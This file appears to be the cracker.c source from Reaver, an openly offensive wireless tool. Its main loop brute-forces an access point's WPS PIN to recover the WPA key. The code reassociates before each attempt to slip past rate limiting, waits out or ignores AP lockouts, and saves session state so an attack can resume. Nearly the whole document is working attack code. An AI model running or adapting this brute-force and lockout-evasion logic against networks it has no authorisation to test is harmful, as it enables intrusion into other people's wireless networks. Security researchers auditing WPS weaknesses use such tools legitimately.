/*
 * Reaver - Main cracking functions
 * Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#include "cracker.h"

time_t last_display = 0;
int last_attempts = 0;

/* Brute force all possible WPS pins for a given access point */
void crack()
{
    unsigned char *bssid = NULL;
    char *pin = NULL;
    int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
    time_t start_time = 0;
    enum wps_result result = 0;

    if(!get_iface())
    {
        return;
    }

    if(get_max_pin_attempts() == -1)
    {
        cprintf(CRITICAL, "[X] ERROR: This device has been blacklisted and is not supported.\n");
        return;
    }

    /* Initialize network interface */
    set_handle(capture_init(get_iface()));

    if(get_handle() != NULL)
    {
        generate_pins();

        /* Restore any previously saved session */
        if(get_static_p1() == NULL)
        {
            restore_session();
        }

        /* Convert BSSID to a string */
        bssid = mac2str(get_bssid(), ':');

        /* 
         * We need to get some basic info from the AP, and also want to make sure the target AP
         * actually exists, so wait for a beacon packet 
         */
        cprintf(INFO, "[+] Waiting for beacon from %s\n", bssid);
        read_ap_beacon();
        process_auto_options();

        /* I'm fairly certian there's a reason I put this in twice. Can't remember what it was now though... */	
        if(get_max_pin_attempts() == -1)
        {
            cprintf(CRITICAL, "[X] ERROR: This device has been blacklisted and is not supported.\n");
            return;
        }

        /* This initial association is just to make sure we can successfully associate */
        while(!reassociate())
        {
            if(assoc_fail_count == MAX_ASSOC_FAILURES)
            {
                assoc_fail_count = 0;
                cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
            }
            else
            {
                assoc_fail_count++;
            }
        }
        cprintf(INFO, "[+] Associated with %s (ESSID: %s)\n", bssid, get_ssid());

        /* Used to calculate pin attempt rates */
        start_time = time(NULL);

        /* If the key status hasn't been explicitly set by restore_session(), ensure that it is set to KEY1_WIP */
        if(get_key_status() <= KEY1_WIP)
        {
            set_key_status(KEY1_WIP);
        }
        /* 
         * If we're starting a session at KEY_DONE, that means we've already cracked the pin and the AP is being re-attacked.
         * Re-set the status to KEY2_WIP so that we properly enter the main cracking loop.
         */
        else if(get_key_status() == KEY_DONE)
        {
            set_key_status(KEY2_WIP);
        }

        cprintf(INFO, "[+] Starting Cracking Session. Pin count: %i, Max pin attempts: %i\n", get_pin_count(), get_max_pin_attempts());

        /* Main cracking loop */
        for(loop_count=0, sleep_count=0; get_key_status() != KEY_DONE; loop_count++, sleep_count++)
        {
            /* 
             * Some APs may do brute force detection, or might not be able to handle an onslaught of WPS
             * registrar requests. Using a delay here can help prevent the AP from locking us out.
             */
            pcap_sleep(get_delay());

            /* Users may specify a delay after x number of attempts */
            if((get_recurring_delay() > 0) && (sleep_count == get_recurring_delay_count()))
            {
                cprintf(VERBOSE, "[+] Entering recurring delay of %d seconds\n", get_recurring_delay());
                pcap_sleep(get_recurring_delay());
                sleep_count = 0;
            }

            /* 
             * Some APs identify brute force attempts and lock themselves for a short period of time (typically 5 minutes).
             * Verify that the AP is not locked before attempting the next pin.
             */
            while(get_ignore_locks() == 0 && is_wps_locked())
            {
                cprintf(WARNING, "[!] WARNING: Detected AP rate limiting, waiting %d seconds before re-checking\n", get_lock_delay());
                pcap_sleep(get_lock_delay());

            }

            /* Initialize wps structure */
            set_wps(initialize_wps_data());
            if(!get_wps())
            {
                cprintf(CRITICAL, "[-] Failed to initialize critical data structure\n");
                break;
            }

            /* Try the next pin in the list */
            pin = build_next_pin();
            if(!pin)
            {
                cprintf(CRITICAL, "[-] Failed to generate the next payload\n");
                break;
            }
            else
            {
                cprintf(WARNING, "[+] Trying pin %s.\n", pin);
            }

            /* 
             * Reassociate with the AP before each WPS exchange. This is necessary as some APs will
             * severely limit our pin attempt rate if we do not.
             */
            assoc_fail_count = 0;
            while(!reassociate())
            {
                if(assoc_fail_count == MAX_ASSOC_FAILURES)
                {
                    assoc_fail_count = 0;
                    cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
                }
                else
                {
                    assoc_fail_count++;
                }
            }


            /* 
             * Enter receive loop. This will block until a receive timeout occurs or a
             * WPS transaction has completed or failed.
             */
            result = do_wps_exchange();

            switch(result)
            {
                /* 
                 * If the last pin attempt was rejected, increment 
                 * the pin counter, clear the fail counter and move 
                 * on to the next pin.
                 */
                case KEY_REJECTED:
                    fail_count = 0;
                    advance_pin_count();
                    cprintf(WARNING, "[+] Pin count advanced: %i. Max pin attempts: %i\n", get_pin_count(), get_max_pin_attempts());
                    break;
                    /* Got it!! */
                case KEY_ACCEPTED:
                    break;
                    /* Unexpected timeout or EAP failure...try this pin again */
                default:
                    cprintf(WARNING, "[!] WPS transaction failed (code: 0x%.2X), re-trying last pin\n", result);
                    fail_count++;
                    break;
            }

            /* If we've had an excessive number of message failures in a row, print a warning */
            if(fail_count == WARN_FAILURE_COUNT)
            {
                cprintf(WARNING, "[!] WARNING: %d failed connections in a row\n", fail_count);
                fail_count = 0;
                pcap_sleep(get_fail_delay());
            }

            /* Display status and save current session state every DISPLAY_PIN_COUNT loops */
            if(loop_count == DISPLAY_PIN_COUNT)
            {
                save_session();
                display_status(start_time);
                loop_count = 0;
            }

            /* 
             * The WPA key and other settings are stored in the globule->wps structure. If we've 
             * recovered the WPS pin and parsed these settings, don't free this structure. It 
             * will be freed by wpscrack_free() at the end of main().
             */
            if(get_key_status() != KEY_DONE)
            {
                wps_deinit(get_wps());
                set_wps(NULL);
            }
            /* If we have cracked the pin, save a copy */
            else
            {
                set_pin(pin);
            }
            free(pin);
            pin = NULL;

            /* If we've hit our max number of pin attempts, quit */
            if((get_max_pin_attempts() > 0) && 
                    (get_pin_count() == get_max_pin_attempts()))
            {
                if(get_exhaustive()){
                    cprintf(WARNING, "[+] Quitting after %d crack attempts\n", get_max_pin_attempts());
                    break;
                }
                else
                {
                    cprintf(WARNING, "[+] Checksum mode was not successful. Starting exhaustive attack\n");
                    set_exhaustive(1);
                    set_p2_index(0);
                }
            }
        }

        if(bssid) free(bssid);
        if(get_handle())
        {
            pcap_close(get_handle());
            set_handle(NULL);
        }
    } 
    else 
    {
        cprintf(CRITICAL, "[-] Failed to initialize interface '%s'\n", get_iface());
    }
}

/* 
 * Increment the index into the p1 or p2 array as appropriate.
 * If we're still trying to brute force the first half, increment p1.
 * If we're working on the second half, increment p2.
 */
void advance_pin_count()
{
    if(get_key_status() == KEY1_WIP)
    {
        set_p1_index(get_p1_index() + 1);
    } 
    else if(get_key_status() == KEY2_WIP)
    {
        set_p2_index(get_p2_index() + 1);
    }
}

int get_pin_count()
{
    int pin_count = 0;
    if(get_key_status() == KEY1_WIP)
    {
        pin_count = get_p1_index() + get_p2_index();
    } 
    else if(get_key_status() == KEY2_WIP)
    {
        pin_count = P1_SIZE + get_p2_index();
    }
    return pin_count;
}

/* Displays the status and rate of cracking */
void display_status(time_t start_time)
{
    float percentage = 0;
    int attempts = 0;
    time_t now = 0, diff = 0, expected = 0;
    int days = 0, hours = 0, minutes = 0, seconds = 0;

    if(get_key_status() == KEY1_WIP)
    {
        attempts = get_p1_index() + get_p2_index();
    }
    /* 
     * If we've found the first half of the key, then the entire key1 keyspace
     * has been exhausted/eliminated. Our output should reflect that.
     */
    else if(get_key_status() == KEY2_WIP)
    {
        attempts = P1_SIZE + get_p2_index();
    }
    else if(get_key_status() == KEY_DONE)
    {
        attempts = get_max_pin_attempts();
    }

    percentage = (float) (((float) attempts / (get_max_pin_attempts())) * 100);

    now = time(NULL);
    diff = (int) (now - start_time);

    if(diff > 0)
    {
        seconds = diff % 60;
        int t_minutes = diff / 60;
        minutes = t_minutes % 60;
        int t_hours = t_minutes / 60;
        hours = t_hours % 24;
        days = t_hours / 24;
    }


    cprintf(INFO, "[+] %.2f%% complete. Elapsed time: %id%ih%im%is.\n", percentage, days, hours, minutes, seconds);
    if(last_display && attempts != last_attempts)
    {
        expected = ((now - last_display)/(attempts - last_attempts)) * (get_max_pin_attempts() - attempts);
        if(expected > 0)
        {
            seconds = expected % 60;
            int t_minutes = expected / 60;
            minutes = t_minutes % 60;
            int t_hours = t_minutes / 60;
            hours = t_hours % 24;
            days = t_hours / 24;
        }
        cprintf(INFO, "[+] Estimated Remaining time: %id%ih%im%is\n", days, hours, minutes, seconds);
    }
    last_display = now;
    last_attempts = attempts;

    return;
}
